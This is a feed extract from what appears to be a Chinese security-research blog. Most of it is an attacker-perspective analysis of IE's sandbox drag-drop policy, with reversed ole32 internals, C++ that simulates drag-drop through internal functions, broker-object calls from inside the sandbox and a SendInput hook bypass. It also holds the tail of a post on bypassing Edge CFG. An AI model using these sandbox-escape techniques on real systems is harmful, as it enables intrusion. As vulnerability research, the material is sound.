<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.text</span>:002AB460 <span class="keyword">push</span>    <span class="literal">ebp</span></span><br><span class="line"><span class="string">.text</span>:002AB461 <span class="keyword">mov</span>     <span class="literal">ebp</span>, <span class="literal">esp</span></span><br><span class="line"><span class="string">.text</span>:002AB463 <span class="keyword">lea</span>     <span class="literal">eax</span>, [<span class="literal">esp</span>+arg_0]</span><br><span class="line"><span class="string">.text</span>:002AB467 <span class="keyword">push</span>    <span class="literal">eax</span></span><br><span class="line"><span class="string">.text</span>:002AB468 <span class="keyword">call</span>    <span class="keyword">Js</span>::JavascriptFunction::DeferredParse</span><br><span class="line"><span class="string">.text</span>:002AB46D <span class="keyword">mov</span>     <span class="literal">ecx</span>, <span class="literal">eax</span>        <span class="comment">; this</span></span><br><span class="line"><span class="string">.text</span>:002AB46F <span class="keyword">call</span>    <span class="literal">ds</span>:___guard_check_icall_fptr  //增加cfg检查</span><br><span class="line"><span class="string">.text</span>:002AB475 <span class="keyword">mov</span>     <span class="literal">eax</span>, <span class="literal">ecx</span></span><br><span class="line"><span class="string">.text</span>:002AB477 <span class="keyword">pop</span>     <span class="literal">ebp</span></span><br><span class="line"><span class="string">.text</span>:002AB478 <span class="keyword">jmp</span>     <span class="literal">eax</span></span><br><span class="line"><span class="string">.text</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2><p><a href="http://xlab.tencent.com/cn/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine/">利用Chakra JIT绕过DEP和CFG</a><br><a href="https://github.com/exp-sky/HitCon-2015-spartan-0day-exploit/blob/master/Spartan%200day%20%26%20Exploit-m.pdf" target="_blank" rel="external">spartan 0day &amp; exploit</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文源自一次与<a href="http://weibo.com/101174?from=feed&amp;loc=at&amp;nick=tombkeeper&amp;is_all=1">TK</a>闲聊，期间得知成功绕过CFG的经过与细节(参考：<a href="http://xlab.tencent.com/cn/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine/">利用Chakra JIT绕过DEP和CFG</a>)。随即出于对技术的兴趣，也抽出一些时间看了相关的东西，结果发现了另一处绕过CFG的位置。所以这篇文章中提到的思路与技术归根结底是来自<a href="http://weibo.com/101174?from=feed&amp;loc=at&amp;nick=tombkeeper&amp;is_all=1">TK</a>提示的，在此特别感谢。</p>
<p>关于CFG的分析文章已经有很多了，想要了解的话可以参考我之前在HitCon 2015上的演讲(<a href="https://github.com/exp-sky/HitCon-2015-spartan-0day-exploit/blob/master/Spartan%200day%20%26%20Exploit-m.pdf">spartan 0day &amp; exploit</a>)。要说明的是，本文的内容即为我演讲中马赛克的部分，至此通过一次内存写实现edge的任意代码执行方法就全部公开了。<br>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[IE沙箱拖拽安全策略解析]]></title>
    <link href="http://xlab.tencent.com/cn/2015/12/17/ie-sandbox-drop-security-policy/"/>
    <id>http://xlab.tencent.com/cn/2015/12/17/ie-sandbox-drop-security-policy/</id>
    <published>2015-12-17T07:56:47.000Z</published>
    <updated>2015-12-18T01:19:46.000Z</updated>
    <content type="html"><![CDATA[<p>IE沙箱逃逸是IE浏览器安全研究的一个重要课题，其中有一类漏洞会借助ElevationPolicy设置中的白名单程序的缺陷来完成沙箱逃逸。IE在注册表中有一个和ElevationPolicy类似的名为DragDrop策略设置，这引起了我们的注意。在本文中，笔者将以一个攻击者的视角，尝试各种途径来突破IE沙箱的这一安全策略，通过分析所遇到的障碍，达到对IE沙箱拖拽安全策略进行详细解析的目的。</p>
<a id="more"></a>
<h2 id="0x01_IE沙箱的拖拽策略">0x01 IE沙箱的拖拽策略</h2><p>IE沙箱逃逸技术中有一类是利用ElevationPolicy中的白名单程序的问题去执行任意代码，在注册表中，有一个和ElevationPolicy类似的配置，名为DragDrop，具体注册表路径如下：<br>HKLM\Software\Microsoft\Internet Explorer\Low Rights\DragDrop<br>如下图所示：</p>
<p><img src="1.png" alt=""></p>
<p>DragDrop Policy值的含义如下：<br>0：目标窗口是无效的DropTarget，拒绝；<br>1：目标窗口是有效的DropTarget，但无法复制内容；<br>2：弹框询问用户，允许后将内容复制到目标窗口；<br>3：静默允许拖拽。</p>
<p>在一个干净的Windows 8.1系统上，DragDrop目录下默认有三个程序：iexplore.exe, explorer.exe, notepad.exe，它们的Policy值都是3。当目标程序的Policy值为2时，向目标程序窗口拖拽文件，IE会弹出一个提示框，如下图所示：</p>
<p><img src="2.png" alt=""></p>
<h2 id="0x02_Explorer进程的拖拽问题">0x02 Explorer进程的拖拽问题</h2><p>在从IE往Explorer上拖拽文件时，虽然DragDrop Policy值设置为了3，IE不会弹框，但是Explorer进程会会弹一个提示框，如下图所示：</p>
<p><img src="3.png" alt=""></p>
<p>然而，当我们从IE中向Explorer侧边栏的树形文件夹结构中拖拽文件时，并不会弹框。这应该是Explorer程序实现上的一个疏漏。进一步设想，如果我们能够在IE沙箱中通过程序模拟鼠标的拖拽操作，那么就能够利用Explorer的这个问题跨越IE沙箱的安全边界。</p>
<h2 id="0x03_不使用鼠标完成OLE拖拽">0x03 不使用鼠标完成OLE拖拽</h2><p>OLE拖拽是一种通用的文件拖拽方式，它采用了OLE的接口设计方法来实现拖拽功能，使得拖拽的实现通用且模块化。OLE拖拽技术包含三个基本接口：</p>
<ol>
<li>IDropSource接口：表示拖拽操作的源对象，由源对象实现；</li>
<li>IDropTarget接口：表示拖拽操作的目标对象，由目标对象实现；</li>
<li>IDataObject接口：表示拖拽操作中传输的数据，由源对象实现。</li>
</ol>
<p>下图描述了一个完整的OLE拖拽操作需要实现的关键组件：</p>
<p><img src="4.png" alt=""></p>
<p>我们要模拟鼠标拖拽，则只需要实现IDropSource和IDataObject接口。正常的OLE拖拽操作的核心是调用ole32!DoDragDrop函数，该函数原型如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">DoDragDrop</span><span class="params">(</span><br><span class="line">    IDataObject    *pDataObject,   <span class="comment">// Pointer to the data object</span></span><br><span class="line">    IDropSource    *pDropSource,   <span class="comment">// Pointer to the source</span></span><br><span class="line">    DWORD          dwOKEffect,    <span class="comment">// Effects allowed by the source</span></span><br><span class="line">    DWORD          *pdwEffect      <span class="comment">// Pointer to effects on the source</span></span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>DoDragDrop的参数中包含了拖拽源对象和拖拽数据的信息，在DoDragDrop函数内部通过鼠标指针位置来获取拖拽目标对象的信息。接下来，笔者给出一种不使用鼠标，而是用代码模拟的方式来完成文件拖拽的方法。</p>
<p>要通过代码模拟鼠标拖拽操作，即要将DoDragDrop函数中GUI操作的部分剥离出来，找出真正执行拖拽操作的函数，将所需要的参数直接传递给它来完成拖拽操作。这里以Win7上的ole32.dll 6.1.7601.18915为例，说明DoDragDrop内部的实现。</p>
<p>Ole32!DoDragDrop的主要逻辑如下：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HRESULT __stdcall DoDragDrop(</span><br><span class="line">    LPDATAOBJECT pDataObj, </span><br><span class="line">    LPDROPSOURCE pDropSource, </span><br><span class="line">    DWORD        dwOKEffects, </span><br><span class="line">    LPDWORD      pdwEffect)</span><br><span class="line">&#123;</span><br><span class="line">    CDragOperationdrgop<span class="comment">;</span></span><br><span class="line">    HRESULT hr<span class="comment">;</span></span><br><span class="line">    CDragOperation<span class="number">::CD</span>ragOperation(</span><br><span class="line">        &amp;drgop, </span><br><span class="line">        pDataObj, </span><br><span class="line">        pDropSource, </span><br><span class="line">        dwOKEffects, </span><br><span class="line">        pdwEffect, </span><br><span class="line">        &amp;hr)<span class="comment">;</span></span><br><span class="line">    if ( hr&gt;= 0 )&#123;</span><br><span class="line">        while ( CDragOperation<span class="number">::</span>UpdateTarget(&amp;drgop)</span><br><span class="line">                &amp;&amp;CDragOperation<span class="number">::D</span>ragOver(&amp;drgop)</span><br><span class="line">                &amp;&amp;CDragOperation<span class="number">::</span>HandleMessages(&amp;drgop) )</span><br><span class="line">            hr = CDragOperation<span class="number">::C</span>ompleteDrop(&amp;drgop)<span class="comment">;</span></span><br><span class="line">         &#125;</span><br><span class="line">         CDragOperation<span class="number">::</span>~CDragOperation(&amp;drgop)<span class="comment">;</span></span><br><span class="line">    return hr<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CDragOperation::CDragOperation是构造函数，其中重要的初始化操作包括：</p>
<pre><code><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span> <span class="variable">GetMarshalledInterfaceBuffer</span>

<span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span> <span class="variable">ClipSetCaptureForDrag</span>

    -<span class="arrow">-&gt;</span><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">GetPrivateClipboardWindow</span>

<span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span> <span class="variable">CreateSharedDragFormats</span>
</code></pre><p>接下来的While循环判断拖拽的状态，最终由CompleteDrop完成拖拽，关键的函数调用如下：</p>
<pre><code><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">CDragOperation</span>::<span class="variable">UpdateTarget</span>

    -<span class="arrow">-&gt;</span><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">CDragOperation</span>::<span class="variable">GetDropTarget</span>

        -<span class="arrow">-&gt;</span><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">PrivDragDrop</span>

<span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">CDragOperation</span>::<span class="variable">DragOver</span>

    -<span class="arrow">-&gt;</span><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">CDropTarget</span>::<span class="variable">DragOver</span>

        -<span class="arrow">-&gt;</span><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">PrivDragDrop</span>

<span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">CDragOperation</span>::<span class="variable">CompleteDrop</span>

    -<span class="arrow">-&gt;</span><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">CDropTarget</span>::<span class="variable">Drop</span>

        -<span class="arrow">-&gt;</span><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">PrivDragDrop</span>
</code></pre><p>可以看到，最终实现拖拽操作的函数是ole32!PrivDragDrop， 通过使用函数偏移硬编码函数地址，可以调用到ole32.dll中的内部函数。我们定义了一个DropData函数来模拟鼠标拖拽，输入参数为目标窗口句柄和被拖拽文件的IDataObject指针，主要逻辑如下：</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">auto</span> <span class="type">DropData</span>(<span class="type">HWND</span> hwndDropTarget, <span class="type">IDataObject</span>* pDataObject)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">GetPrivateClipboardWindow</span>(<span class="type">CLIP_CREATEIFNOTTHERE</span>);</span><br><span class="line">    <span class="type">CreateSharedDragFormats</span>(pDataObject);</span><br><span class="line">    <span class="type">void</span>    *<span class="type">DOBuffer</span> = nullptr;</span><br><span class="line">    <span class="type">HRESULT</span> <span class="literal">result</span> = <span class="type">GetMarshalledInterfaceBuffer</span>(</span><br><span class="line">                         <span class="type">IID_IDataObject</span>, </span><br><span class="line">                         pDataObject, </span><br><span class="line">                         &amp;<span class="type">DOBuffer</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="type">SUCCEEDED</span>(<span class="literal">result</span>))&#123;</span><br><span class="line">        <span class="type">DWORD</span>     dwEffect = <span class="number">0</span>;</span><br><span class="line">        <span class="type">POINTL</span>    ptl = &#123; <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">void</span>      *hDDInfo = nullptr;</span><br><span class="line"></span><br><span class="line">        <span class="type">HRESULT</span> <span class="literal">result</span> = <span class="type">PrivDragDrop</span>(</span><br><span class="line">                             hwndDropTarget, </span><br><span class="line">                             <span class="type">DRAGOP_ENTER</span>,</span><br><span class="line">                             <span class="type">DOBuffer</span>, </span><br><span class="line">                             pDataObject, </span><br><span class="line">                             <span class="type">MK_LBUTTON</span>, </span><br><span class="line">                             ptl, </span><br><span class="line">                             &amp;dwEffect, </span><br><span class="line">                             <span class="number">0</span>, </span><br><span class="line">                             &amp;hDDInfo);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="type">SUCCEEDED</span>(<span class="literal">result</span>))&#123;</span><br><span class="line">        <span class="type">HRESULT</span> <span class="literal">result</span> = <span class="type">PrivDragDrop</span>(</span><br><span class="line">                                 hwndDropTarget, </span><br><span class="line">                                 <span class="type">DRAGOP_OVER</span>, </span><br><span class="line">                                 <span class="number">0</span>, </span><br><span class="line">                                 <span class="number">0</span>, </span><br><span class="line">                                 <span class="type">MK_LBUTTON</span>, </span><br><span class="line">                                 ptl, </span><br><span class="line">                                 &amp;dwEffect, </span><br><span class="line">                                 <span class="number">0</span>, </span><br><span class="line">                                 &amp;hDDInfo);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="type">SUCCEEDED</span>(<span class="literal">result</span>))&#123;</span><br><span class="line">                <span class="type">HWND</span> hClip = <span class="type">GetPrivateClipboardWindow</span>(<span class="type">CLIP_QUERY</span>);</span><br><span class="line">                <span class="type">HRESULT</span> <span class="literal">result</span> = <span class="type">PrivDragDrop</span>(</span><br><span class="line">                                     hwndDropTarget, </span><br><span class="line">                                     <span class="type">DRAGOP_DROP</span>, </span><br><span class="line">                                     <span class="type">DOBuffer</span>, </span><br><span class="line">                                     pDataObject, </span><br><span class="line">                                     <span class="number">0</span>, </span><br><span class="line">                                     ptl, </span><br><span class="line">                                     &amp;dwEffect, </span><br><span class="line">                                     hClip, </span><br><span class="line">                                     &amp;hDDInfo);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标窗口句柄可以通过FindWindow函数获得，将被拖拽文件封装成一个DataObject并获得其IDataObject接口指针的方法有两种：</p>
<ol>
<li>自己编写C++类实现IDataObject接口；</li>
<li>使用现有类库中的实现，如：MFC, Shell32中均有对拖拽接口实现的相关类。</li>
</ol>
<p>笔者这里给出使用MFC类库对文件进行封装并获得其IDataObject接口的方法，实现代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">GetIDataObjectForFile</span><span class="params">(CString filePath)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    COleDataSource*    pDataSource = <span class="keyword">new</span> COleDataSource();</span><br><span class="line">    IDataObject*       pDataObject;</span><br><span class="line">    UINT               uBuffSize = <span class="number">0</span>;</span><br><span class="line">    HGLOBAL            hgDrop;</span><br><span class="line">    DROPFILES*         pDrop;</span><br><span class="line">    TCHAR*             pszBuff;</span><br><span class="line">    FORMATETC          fmtetc = &#123; CF_HDROP, <span class="literal">NULL</span>, DVASPECT_CONTENT, -<span class="number">1</span>, TYMED_HGLOBAL &#125;;</span><br><span class="line">   </span><br><span class="line">    uBuffSize = <span class="keyword">sizeof</span>(DROPFILES) + <span class="keyword">sizeof</span>(TCHAR) * (lstrlen(filePath) + <span class="number">2</span>);</span><br><span class="line">    hgDrop = GlobalAlloc(GHND | GMEM_SHARE, uBuffSize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hgDrop != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        pDrop = (DROPFILES*)GlobalLock(hgDrop);</span><br><span class="line">        <span class="keyword">if</span> (pDrop != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            pDrop-&gt;pFiles = <span class="keyword">sizeof</span>(DROPFILES);</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> _UNICODE</span></span><br><span class="line">    pDrop-&gt;fWide = TRUE;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            pszBuff = (TCHAR*)(LPBYTE(pDrop) + <span class="keyword">sizeof</span>(DROPFILES));</span><br><span class="line">            lstrcpy(pszBuff, (LPCTSTR)filePath);</span><br><span class="line">            GlobalUnlock(hgDrop);</span><br><span class="line">            pDataSource-&gt;CacheGlobalData(CF_HDROP, hgDrop, &amp;fmtetc);</span><br><span class="line">            pDataObject = (IDataObject *)pDataSource-&gt;GetInterface(&amp;IID_IDataObject);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            GlobalFree(pDrop);</span><br><span class="line">            pDataObject = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        GlobalFree(hgDrop);</span><br><span class="line">        pDataObject = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pDataObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04_IE沙箱的拖拽实现">0x04 IE沙箱的拖拽实现</h2><p>当我们在IE沙箱中用鼠标进行拖拽操作时，沙箱内的IE Tab进程会通过ShdocvwBroker将数据转发给沙箱外的主进程，在主进程中完成拖拽操作。也就是说，真正完成拖拽操作是在沙箱外的IE主进程内。两个进程的函数调用情况大致如下：</p>
<p>IE子进程（沙箱中）：</p>
<pre><code><span class="variable">MSHTML</span><span class="exclamation_mark">!</span><span class="variable">CDoc</span>::<span class="variable">DoDrag</span>

    -<span class="arrow">-&gt;</span><span class="variable">MSHTML</span><span class="exclamation_mark">!</span><span class="variable">CDragDropManager</span>::<span class="variable">DoDrag</span>

        -<span class="arrow">-&gt;</span><span class="function_or_atom">combase</span><span class="exclamation_mark">!</span><span class="variable">ObjectStubless</span>

            -<span class="arrow">-&gt;</span> … 发送<span class="variable">ALPC</span>消息给<span class="variable">IE</span>主进程
</code></pre><p>IE主进程：</p>
<pre><code>… 接收<span class="variable">IE</span>子进程发来的<span class="variable">ALPC</span>消息

    -<span class="arrow">-&gt;</span><span class="variable">RPCRT4</span><span class="exclamation_mark">!</span><span class="variable">Invoke</span>

        -<span class="arrow">-&gt;</span><span class="variable">IEFRAME</span><span class="exclamation_mark">!</span><span class="variable">CShdocvwBroker</span>::<span class="variable">PerformDoDragDrop</span>

               -<span class="arrow">-&gt;</span><span class="variable">IEFRAME</span><span class="exclamation_mark">!</span><span class="variable">CShdocvwBroker</span>::<span class="variable">PerformDoDragDropThreadProc</span>

                -<span class="arrow">-&gt;</span><span class="function_or_atom">ole32</span><span class="exclamation_mark">!</span><span class="variable">DoDragDrop</span>
</code></pre><h2 id="0x05_IE沙箱对拖拽操作的安全限制">0x05 IE沙箱对拖拽操作的安全限制</h2><p>在IE沙箱中，我们是可以直接调到Broker中的函数的。通过自己创建一个IEUserBroker，再由IEUserBroker创建一个ShdocvwBroker，我们就可以调到主进程中的IEFRAME!CShdocvwBroker::PerformDoDragDrop函数。调用的实现方法大致如下：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">typedef HRESULT<span class="list">(<span class="keyword">__stdcall</span> <span class="variable">*ppCoCreateUserBroker)(IIEUserBroker *</span><span class="variable">*ppBroker);</span><br><span class="line"></span><br><span class="line">IIEUserBrokerPtrCreateIEUserBroker()</span><br><span class="line">&#123;</span><br><span class="line">    HMODULE hMod = LoadLibrary("iertutil.dll");</span><br><span class="line">    pCoCreateUserBroker CoCreateUserBroker;</span><br><span class="line">    CoCreateUserBroker = (pCoCreateUserBroker)GetProcAddress(hMod, (LPCSTR)58);</span><br><span class="line">    if (CoCreateUserBroker)&#123;</span><br><span class="line">        IIEUserBrokerPtr broker;</span><br><span class="line">        HRESULT ret = CoCreateUserBroker(&amp;broker);</span><br><span class="line">        return broker;</span><br><span class="line">    &#125;</span><br><span class="line">    return nullptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IIEUserBrokerPtr broker = CreateIEUserBroker();</span><br><span class="line">IShdocvwBroker*</span> shdocvw<span class="comment">;</span></span><br><span class="line">broker-&gt;BrokerCreateKnownObject<span class="list">(</span><br><span class="line">            <span class="keyword">CLSID_CShdocvwBroker</span>,</span><br><span class="line">            _uuidof<span class="list">(<span class="keyword">IShdocvwBroker</span>)</span>,</span><br><span class="line">            <span class="list">(<span class="keyword">IUnknown**</span>)</span><span class="keyword">&amp;shdocvw</span>)</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">shdocvw-&gt;PerformDoDragDrop<span class="list">(</span><br><span class="line">            <span class="keyword">HWND__</span> <span class="variable">*,</span><br><span class="line">            IEDataObjectWrapper *</span>,</span><br><span class="line">            IEDropSourceWrapper <span class="variable">*,</span><br><span class="line">            ulong,</span><br><span class="line">            ulong,</span><br><span class="line">            ulong *</span>,</span><br><span class="line">            long <span class="variable">*);</span></span></span></span><br></pre></td></tr></table></figure>
<p>拖拽功能最终是调用ole32!DoDragDrop函数来实现的，DoDragDrop所需的参数都可以由PerformDoDragDrop函数传入（参考0x03章节中DoDragDrop函数的参数信息）。至此，我们已经可以从沙箱内直接走到沙箱外的ole32!DoDragDrop函数，且传入参数可控。而要模拟鼠标拖拽操作，有两个思路：</p>
<ol>
<li>使用0x02章节中所讲的直接调用ole32.dll内部函数的方法；</li>
<li>调用API改变鼠标位置。</li>
</ol>
<p>对于第一种方法，由于我们是在沙箱内，只能通过Broker接口的代理才能从沙箱中出来，进入到IE主进程的进程空间。所以我们并不能调到主进程中dll的内部函数，进而这种方法是不可行的。</p>
<p>第二种方法，如果我们能够改变鼠标的位置，那么在ole32!DoDragDrop函数内部通过鼠标位置获取目标窗口信息的步骤就会成功通过，就能够完成模拟鼠标拖拽的目标。然而实验过程中，我们发现在IE沙箱中是无法通过API来改变鼠标指针位置的。下面来具体说明这个问题。</p>
<p>笔者想到的能够改变鼠标指针位置的方法有两种：<br>1.通过SendInput函数模拟鼠标动作。SendInput函数从用户态到内核态的函数调用关系如下所示：</p>
<pre><code><span class="variable">User32</span><span class="exclamation_mark">!</span><span class="variable">SendInput</span>

    -<span class="arrow">-&gt;</span><span class="function_or_atom">user32</span><span class="exclamation_mark">!</span><span class="variable">NtUserSendInput</span>

        -<span class="arrow">-&gt;</span><span class="function_or_atom">win32k</span>.<span class="function_or_atom">sys</span><span class="exclamation_mark">!</span><span class="variable">NtUserSendInput</span>

            -<span class="arrow">-&gt;</span><span class="function_or_atom">win32k</span>.<span class="function_or_atom">sys</span><span class="exclamation_mark">!</span><span class="function_or_atom">xxxSendInput</span>

                -<span class="arrow">-&gt;</span><span class="function_or_atom">win32k</span>.<span class="function_or_atom">sys</span><span class="exclamation_mark">!</span><span class="function_or_atom">xxxMouseEventDirect</span>
</code></pre><p>2.通过SetCursorPos函数改变鼠标指针位置。SetCursorPos函数从用户态到内核态的函数调用关系如下：</p>
<pre><code><span class="function_or_atom">user32</span><span class="exclamation_mark">!</span><span class="variable">SetCursorPos</span>

    -<span class="arrow">-&gt;</span><span class="function_or_atom">user32</span><span class="exclamation_mark">!</span><span class="variable">SetPhysicalCursorPos</span>

        -<span class="arrow">-&gt;</span><span class="function_or_atom">user32</span><span class="exclamation_mark">!</span><span class="variable">NtUserCallTwoParam</span>

            -<span class="arrow">-&gt;</span><span class="function_or_atom">win32k</span>.<span class="function_or_atom">sys</span><span class="exclamation_mark">!</span><span class="variable">NtUserCallTwoParam</span>

                -<span class="arrow">-&gt;</span><span class="function_or_atom">win32k</span>.<span class="function_or_atom">sys</span><span class="exclamation_mark">!</span><span class="function_or_atom">zzzSetCursorPos</span>

                    -<span class="arrow">-&gt;</span><span class="function_or_atom">win32k</span>.<span class="function_or_atom">sys</span><span class="exclamation_mark">!</span><span class="function_or_atom">zzzSetCursorPosByType</span>
</code></pre><p>先来看SendInput，如果在IE沙箱中直接调用SendInput函数来改变鼠标指针位置的话，会返回0x5拒绝访问错误，这是因为IEShims.dll中对SendInput函数做了hook，在hook函数中做了处理。具体做处理的函数位置如下：</p>
<pre><code><span class="constant">IEShims.</span>dll!<span class="constant">NS_InputQueueLowMIC:</span><span class="symbol">:APIHook_SendInput</span>

    --&gt; <span class="constant">IEFRAME!FrameUtilExports:</span><span class="symbol">:PreSendInput</span>

        --&gt; <span class="constant">ShimHelper:</span><span class="symbol">:PreSendInput</span>
</code></pre><p>这个hook很容易绕过，我们直接调用NtUserSendInput即可，不过这个函数没有导出，需要通过函数偏移硬编码它的地址。</p>
<p>直接调用NtUserSendInput，该函数不返回错误，但是鼠标指针的位置并没有改变。究其原因，函数调用的失败是由于UIPI( User Interface Privilege Isolation )的限制。调用SetCursorPos函数也会出现相同的情况。</p>
<p>UIPI是从Windows Vista开始系统新加入的一项安全特性，它在Windows内核中实现，具体位置如下：</p>
<p>win32k! CheckAccessForIntegrityLevel</p>
<p>在Win8.1上，这个函数的逻辑如下：</p>
